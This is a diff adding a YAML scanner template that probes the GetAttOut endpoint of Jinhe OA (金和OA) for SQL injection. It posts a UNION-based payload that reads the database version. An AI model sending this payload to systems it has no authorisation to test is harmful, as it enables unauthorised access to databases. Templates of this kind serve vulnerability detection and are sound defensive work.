@@ -1,0 +1,15 @@
+name: 金和OA-GetAttOut-sql
+description: >-
+  sql注入
+alwaysExecute: false
+matchCount: 1
+rules:
+  - method: POST
+    path: /jc6/JHSoft.WCF/TEST/GetAttOut
+    headers:
+      Content-Type: "application/x-www-form-urlencoded"
+    body: >-
+      1' union select null,null,@@version,null,null,null--
+    expression:
+      status: 200
+      body_all: ["SQL Server"]
